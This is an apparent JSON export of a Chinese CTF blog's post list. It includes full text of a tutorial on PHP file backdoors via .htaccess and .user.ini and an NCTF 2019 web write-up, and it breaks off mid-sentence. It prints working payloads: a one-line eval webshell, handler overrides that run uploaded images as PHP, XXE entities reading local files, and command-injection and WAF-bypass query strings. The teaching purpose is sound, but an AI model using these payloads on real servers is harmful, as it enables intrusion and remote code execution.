{"name":"ctf","slug":"ctf","count":24,"postlist":[{"title":"black_magic","slug":"Black-magic","date":"2019-08-19T10:59:50.000Z","updated":"2019-09-03T14:23:09.995Z","comments":true,"path":"api/articles/Black-magic.json","excerpt":"<p>别说了，听我的！php is the best language!我不允许你有别的想法！ </p>\n<p>我要我觉得！不要你觉得！</p>","keywords":null,"cover":null,"content":null,"text":"别说了，听我的！php is the best language!我不允许你有别的想法！ 我要我觉得！不要你觉得！php 弱类型总结字符与数字的比较&lt;?php$a=1;if($a=TRUE)    echo &quot;1111\\n&quot;;if($a=&apos;a&","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"弱类型","slug":"弱类型","count":1,"path":"api/tags/弱类型.json"}]},{"title":"命令执行漏洞(Command Execution)","slug":"Command-Execution","date":"2019-03-23T07:13:47.000Z","updated":"2019-08-20T14:59:26.283Z","comments":true,"path":"api/articles/Command-Execution.json","excerpt":"<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system,exec,shell_exec等，当用户可以执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行漏洞。</p>","keywords":null,"cover":null,"content":null,"text":"当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system,exec,shell_exec等，当用户可以执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行漏洞。漏洞概念当应用需要调用一些外部程序去处理内容的情况下，就会用","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"命令执行","slug":"命令执行","count":1,"path":"api/tags/命令执行.json"}]},{"title":"HostSplit-Exploitable","slug":"HostSplit","date":"2019-08-22T03:39:23.000Z","updated":"2019-09-03T14:21:11.682Z","comments":true,"path":"api/articles/HostSplit.json","excerpt":"<p>🐱黑帽大会议题</p>","keywords":null,"cover":"http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg","content":null,"text":"🐱黑帽大会议题8/22/2019 11:39:23 AM HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习IDN 与 UTF-8IDN国际化域名IDNs (Internationalized Domai","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"python","slug":"python","count":1,"path":"api/tags/python.json"}]},{"title":"JavaScript Prototype 污染攻击","slug":"JavaScript原型污染","date":"2019-08-31T13:55:35.000Z","updated":"2019-09-03T14:19:49.369Z","comments":true,"path":"api/articles/JavaScript原型污染.json","excerpt":"<p>JS真有趣！</p>","keywords":null,"cover":"https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476","content":null,"text":"JS真有趣！JavaScript Prototype 污染攻击JS基本语法输出window.alert();弹出警告框console.log();将内容写到控制台  a = 5;<br>  b = 6;<br>  c = a + b;<br>  console.log(c);<b","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"javascript","slug":"javascript","count":1,"path":"api/tags/javascript.json"}]},{"title":"LSB图片隐写","slug":"LSB隐写","date":"2018-03-23T07:13:47.000Z","updated":"2019-08-10T07:51:34.491Z","comments":true,"path":"api/articles/LSB隐写.json","excerpt":"<p>图片隐写题老是一头雾水，借着DD的地铁来学一下吧</p>","keywords":null,"cover":"https://i.imgur.com/GQM4keP.png","content":null,"text":"图片隐写题老是一头雾水，借着DD的地铁来学一下吧LSB隐写利用图像中的最低有效位进行数据存储。 [Figure] 提示密钥为小写字母，尝试解密就得到了flag.","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"LSB","slug":"LSB","count":1,"path":"api/tags/LSB.json"},{"name":"MISC","slug":"MISC","count":1,"path":"api/tags/MISC.json"},{"name":"隐写","slug":"隐写","count":1,"path":"api/tags/隐写.json"}]},{"title":"MYSQL LOAD DATA","slug":"MySQL-LOAD-DATA","date":"2019-08-07T14:14:02.000Z","updated":"2019-09-03T14:28:41.171Z","comments":true,"path":"api/articles/MySQL-LOAD-DATA.json","excerpt":"<p>通过伪造恶意服务器造成的攻击<br>😫😄</p>","keywords":null,"cover":"https://upload-images.jianshu.io/upload_images/9113969-2c46042011a696ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240","content":null,"text":"通过伪造恶意服务器造成的攻击<br>😫😄配置mysql启动mysql服务service mysql startMariaDB [mysql]&gt; create database test;MariaDB [test]&gt; create table users(    ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"mysql load data","slug":"mysql-load-data","count":1,"path":"api/tags/mysql-load-data.json"}]},{"title":"redis与ssrf","slug":"SSRF","date":"2019-08-16T08:11:22.000Z","updated":"2019-09-03T14:24:58.258Z","comments":true,"path":"api/articles/SSRF.json","excerpt":"<p>SSRF留坑，没整理完。我真是个小菜鸡~</p>","keywords":null,"cover":null,"content":null,"text":"SSRF留坑，没整理完。我真是个小菜鸡~SSRF函数file_get_contentsfsockopencurl_exec绕过IP限制添加端口 127.0.0.1:80短网址 http://sina.lt/指向任意IP的域名 xip.io进制转换，点分十进制，八进制，二进制，十六","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"redis","slug":"redis","count":2,"path":"api/tags/redis.json"},{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"}]},{"title":"Xdebug","slug":"Xdebug","date":"2019-08-17T15:23:45.000Z","updated":"2019-09-03T14:21:43.620Z","comments":true,"path":"api/articles/Xdebug.json","excerpt":"<p>你从未见过的船新知识点</p>","keywords":null,"cover":null,"content":null,"text":"你从未见过的船新知识点Xdebug如何确定开启动态调试？在vps上监听9000端口  nc -l -vv -p 9000再打开一个窗口执行 curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"Xdebuf","slug":"Xdebuf","count":1,"path":"api/tags/Xdebuf.json"},{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]},{"title":"SSTI-服务器端模板注入","slug":"SSTI","date":"2019-08-30T07:28:13.000Z","updated":"2019-09-10T10:13:55.250Z","comments":true,"path":"api/articles/SSTI.json","excerpt":"<p>终于到了学习SSTI的时间呢！</p>","keywords":null,"cover":"http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png","content":null,"text":"终于到了学习SSTI的时间呢！SSTI-服务器端模板注入8/30/2019 3:28:13 PM 注入原理使用PHP模板引擎Twig作例子演示注入原理&lt;?phprequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloa","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":2,"path":"api/tags/SSTI.json"}]},{"title":"redis与ssrf","slug":"redis","date":"2019-08-10T07:44:26.000Z","updated":"2019-09-03T14:27:08.508Z","comments":true,"path":"api/articles/redis.json","excerpt":"<p>wula!<br>我爱学习！🤫</p>","keywords":null,"cover":"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg","content":null,"text":"wula!<br>我爱学习！🤫redis协议分析tcpdump抓包tcpdump -i lo port 6379 -w redis.pcap在redis执行如下命令127.0.0.1:6379&gt; set name testOK127.0.0.1:6379&gt; get ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"redis","slug":"redis","count":2,"path":"api/tags/redis.json"},{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"}]},{"title":"两种构成文件后门的方法","slug":"两种构成文件后门的方法","date":"2019-09-18T01:19:34.000Z","updated":"2019-09-25T12:07:29.143Z","comments":true,"path":"api/articles/两种构成文件后门的方法.json","excerpt":"","keywords":null,"cover":"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","content":"<h1 id=\"两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini\"><a href=\"#两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini\" class=\"headerlink\" title=\"两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini\"></a>两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini</h1><h2 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h2><p>以下部分摘取于P神的博客<a href=\"http://www.vuln.cn/6001\" title=\"P神博客\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<h3 id=\"user-ini-是什么？\"><a href=\"#user-ini-是什么？\" class=\"headerlink\" title=\".user.ini 是什么？\"></a>.user.ini 是什么？</h3><p>只要是以fastcgi运行的php都可以用<code>.user.ini</code>构成文件后门的方法。相比于<code>.htaccess</code>有更大的利用空间。 </p>\n<p>我们从php手册可以看到php.ini是php默认的配置文件，这里是配置选项列表<a href=\"https://www.php.net/manual/zh/ini.list.php\" title=\"配置项列表\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/ini.list.php</a>  从表中我们可以看到有 <code>PHP_INI_PERDIR</code>、<code>PHP_INI_SYSTEM</code>    、<code>PHP_INI_USER</code>、<code>PHP_INI_ALL</code> 四种模式，那么这四种有什么区别呢？  </p>\n<pre><code>模式                含义\nPHP_INI_USER    可在用户脚本（例如 ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定\nPHP_INI_PERDIR    可在 php.ini，.htaccess 或 httpd.conf 中设定\nPHP_INI_SYSTEM    可在 php.ini 或 httpd.conf 中设定\nPHP_INI_ALL        可在任何地方设定</code></pre><p>这里提到了我们可以自己设置的模式有 <code>PHP_INI_USER</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>。 在这里我们看到了 <code>.user.ini</code> 。翻阅手册<a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" title=\"手册\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/configuration.file.per-user.php</a>可知：</p>\n<blockquote>\n<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p>\n<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>\n<p>在 .user.ini 风格的 INI 文件中只有具有 <strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置可被识别。</p>\n<p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p>\n<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p>\n<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>\n</blockquote>\n<p>同时与php.ini不同的是.user.ini是一个能动态加载的配置文件，修改文件内容之后不需要重启中间件只需要等待  <code>user_ini.cache_ttl</code> 时间即可被加载。</p>\n<p>也就是说 <code>.user.ini</code> 其实就是一个我们可以自定义php配置的文件。</p>\n<h3 id=\"如何利用？\"><a href=\"#如何利用？\" class=\"headerlink\" title=\"如何利用？\"></a>如何利用？</h3><p>从php配置列表里我们发现无法配置一些关键的配置，但是在构成文件后门时我们找到了两个我们可以自己配置的选项：</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt></p>\n<p><strong>auto_prepend_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-prepending.</p>\n</blockquote>\n<p>指定一个文件在主文件之前自动解析，这个被包含的文件相当于在主文件之前调用了 <code>require</code> 函数，路径受到<code>include_path</code> 限制。 <code>include_path</code> 会指定 <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> 这些函数执行时去哪寻找文件。</p>\n<p><strong>auto_append_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-appending.</p>\n<p>Note: If the script is terminated with exit(), auto-append will not occur.</p>\n</blockquote>\n<p>我们利用的重点是第一个配置，同时我们从文档也可以看出在利用时我们需要一个<strong>正常</strong>的php文件来包含我们的webshell，*<em>也就是说我们只有在文件夹里有可以正常解析(使用fastcgi模式解析)的php文件时才能这样利用。<br>*</em><br>使用时也简单直接写在<code>.user.ini</code>中</p>\n<pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id=\"效果如何？\"><a href=\"#效果如何？\" class=\"headerlink\" title=\"效果如何？\"></a>效果如何？</h3><p>环境win10+php-5.45-nts+Nginx</p>\n<p>结果如下：</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg\" alt=\"效果如图\"></p>\n<h2 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h2><h3 id=\"htaccess是什么？\"><a href=\"#htaccess是什么？\" class=\"headerlink\" title=\".htaccess是什么？\"></a>.htaccess是什么？</h3><p>翻阅apaceh官方文档<a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a>可知</p>\n<blockquote>\n<p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p>\n</blockquote>\n<p><code>.htaccess</code> 文件提供了一种目录级别的修改配置的方式。一个文件，包含一条或多条配置指令，放置于目录下，这些配置指令对当前目录和其所有子目录生效。</p>\n<h3 id=\"SetHandler\"><a href=\"#SetHandler\" class=\"headerlink\" title=\"SetHandler\"></a>SetHandler</h3><p>我们在 <code>.htaccess</code> 文件中可以通过增加 <code>handler-name</code> 来配置文件的解析方式。比如你有一个目录，你想让它被 <code>imagemap rule files</code> 解析，你可以在在 <code>.htaccess</code> 文件中加入这段代码：</p>\n<pre><code>SetHandler imap-file</code></pre><p>同样的，<code>AddType</code> 可指示文件管理系统对给出的文件名以选定的文件类型进行解析。</p>\n<pre><code>AddType image/gif .gif</code></pre><p>同时，我们也可以在以 <code>php</code> 作为 <code>Apacec module</code> 时，通过 <code>php_value</code> 来配置PHP的配置选项：</p>\n<pre><code>php_value name value</code></pre><p>设置指定的值. 只适合于 PHP_INI_ALL 和 PHP_INI_PERDIR 类型指令</p>\n<h3 id=\"如何利用？-1\"><a href=\"#如何利用？-1\" class=\"headerlink\" title=\"如何利用？\"></a>如何利用？</h3><p><strong>文件解析上传漏洞</strong></p>\n<p>.htaccess文件中定义了将上传的文件后缀名为 .jpg 格式的文件以 php 格式来解析文件。.htaccess 是apache服务器中的一个配置文件，不是上传的文件的黑名单之内，所以该类型文件可以上传成功。</p>\n<pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>还可以这样：</p>\n<pre><code># FileMatch 参数即为文件名的正则匹配\n&lt;FilesMatch &quot;sniperoj&quot;&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n\n// sniperoj\n&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>文件包含</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file /etc/hosts</code></pre><p><strong>PHP 代码执行</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();</code></pre><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><blockquote>\n<p><a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p>\n<p><a href=\"http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html\" target=\"_blank\" rel=\"noopener\">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/core.html#sethandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p>\n<p><a href=\"https://www.php.net/manual/en/configuration.changes.php\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/en/configuration.changes.php</a></p>\n<p><a href=\"https://www.cnblogs.com/xia0zhiwei/p/4713438.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p>\n<p><a href=\"http://www.vuln.cn/6001\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n</blockquote>\n","text":"两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini.user.ini以下部分摘取于P神的博客http://www.vuln.cn/6001.user.ini 是什么？只要是以fastcgi运行的php都可以用.user.ini构成文件后门的方法。","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"NCTF","slug":"NCTF","date":"2019-11-26T12:45:31.000Z","updated":"2020-04-29T05:45:19.118Z","comments":true,"path":"api/articles/NCTF.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"NCTF\"><a href=\"#NCTF\" class=\"headerlink\" title=\"NCTF\"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Fake-XML-cookbook\"><a href=\"#Fake-XML-cookbook\" class=\"headerlink\" title=\"Fake XML cookbook\"></a>Fake XML cookbook</h3><p>简单的xxe</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; \n\n&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id=\"ture-XML-cookbook\"><a href=\"#ture-XML-cookbook\" class=\"headerlink\" title=\"ture XML cookbook\"></a>ture XML cookbook</h3><p>常用的内网IP文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p>\n<p><strong>requests</strong></p>\n<pre><code>&lt;!DOCTYPE ANY [\n\n&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;\n\n]&gt;\n\n\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>X-Powered-By: PHP/7.4.0RC6\n\n\n&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>解密：</p>\n<pre><code>Main:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST\nLocal:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST</code></pre><p>照着Ip访问，吐槽我的windows下burp响应全是乱码，搞了半天去kali就没事了。</p>\n<h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__file__);\n$string_1 = $_GET[&apos;str1&apos;];\n$string_2 = $_GET[&apos;str2&apos;];\n$cmd = $_GET[&apos;q_w_q&apos;];\n\n\n//1st\nif($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){\n    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;\n}\nelse{\n    die(&apos;23333333&apos;);\n}\n\n\n//2nd\nif(is_numeric($string_1)){\n    $md5_1 = md5($string_1);\n    $md5_2 = md5($string_2);\n    if($md5_1 != $md5_2){\n        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr — 查找字符串的首次出现，\n        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);\n        if($a == $b){\n            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;\n        }\n        else{\n            die(&quot;can u give me the right str???&quot;);\n        }\n    } \n    else{\n        die(&quot;no!!!!!!!!&quot;);\n    }\n}\nelse{\n    die(&apos;is str1 numeric??????&apos;);\n}\n\n\n//3rd\n$query = $_SERVER[&apos;QUERY_STRING&apos;];\nif (strlen($cmd) &gt; 8){\n    die(&quot;too long :(&quot;);\n}\n\nif( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){\n    $arr = explode(&apos; &apos;, $cmd);          //explode — 使用一个字符串分割另一个字符串\n    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){\n        if(substr_count($cmd, &apos;cat&apos;) === 0){\n            system($cmd);\n        }\n        else{\n            die(&apos;ban cat :) &apos;);\n        }\n    }\n    else{\n        die(&apos;bad guy!&apos;);\n    }\n}\nelse{\n    die(&apos;nonono _ is bad&apos;);\n}\n?&gt; </code></pre><p>第一层使用 %0a 截断绕过，第二层md5绕过<a href=\"https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83\" target=\"_blank\" rel=\"noopener\">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> 前面几条0e开头的字符串去解密发现都收费，所以我们使用 <code>s878926199a</code> ,加密完解密得 <code>2120624</code> ，我们可以用数字绕过第一个判断，第三层 使用 <code>.</code> 绕过 <code>_</code> ，<code>%20</code> 替代空格，使用<code>l${x}s</code> 列目录，<code>tac%20f*</code> 读 <code>flag</code> .</p>\n<p>看一个 <code>strstr()</code> 的例子</p>\n<pre><code>$email  = &apos;name@example.com&apos;;\n$domain = strstr($email, &apos;@&apos;);\necho $domain.&quot;\\r\\n&quot;; // 打印 @example.com\n\n$user = strstr($email, &apos;@&apos;, true); // 从 PHP 5.3.0 起\necho $user.&quot;\\r\\n&quot;; // 打印 name\nvar_dump(&quot;01&quot;==true);\n\n输出：\n@example.com\nname\nbool(true)</code></pre><p>payload:</p>\n<pre><code>?num=23333%0a\n&amp;str1=2120624\n&amp;str2=s214587387a\n&amp;q.w.q=tac%20f*</code></pre><h3 id=\"hacker-backdoor\"><a href=\"#hacker-backdoor\" class=\"headerlink\" title=\"hacker backdoor\"></a>hacker backdoor</h3><pre><code> &lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){\n    highlight_file(__file__);\n}\n$code = $_GET[&apos;code&apos;];\n$usrful = $_GET[&apos;useful&apos;];\n\nfunction waf($a){\n    $dangerous = get_defined_functions();    //get_defined_functions — 返回所有已定义函数的数组\n    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //压入栈底\n    foreach ($dangerous[&quot;internal&quot;] as $bad) {\n        if(strpos($a,$bad) !== FALSE){\n        return False;\n        break;\n        }\n    }\n    return True;\n}\n\nif(file_exists($usrful)){\n    if(waf($code)){\n        eval($code);\n    }\n    else{\n        die(&quot;oh,不能输入这些函数哦 :) &quot;);\n    }\n}</code></pre><p>测试一下$dangerous</p>\n<pre><code>&lt;?php  \n$dangerous = get_defined_functions();\narray_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);\nforeach ($dangerous[&quot;internal&quot;] as $bad) { \n    if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){\n        echo &quot;badbad&quot;.&quot;\\r\\n&quot;;\n    }\n}\n?&gt;</code></pre><p>使用命令拼接绕过 waf()</p>\n<pre><code>?code=?&gt;&lt;?php $a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;\n&amp;useful=index.php</code></pre><p>disable_functiongs:</p>\n<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>令执行利用及绕过姿势　　</p>\n<p>写入webshell:</p>\n<p>利用命令注入写一句话php 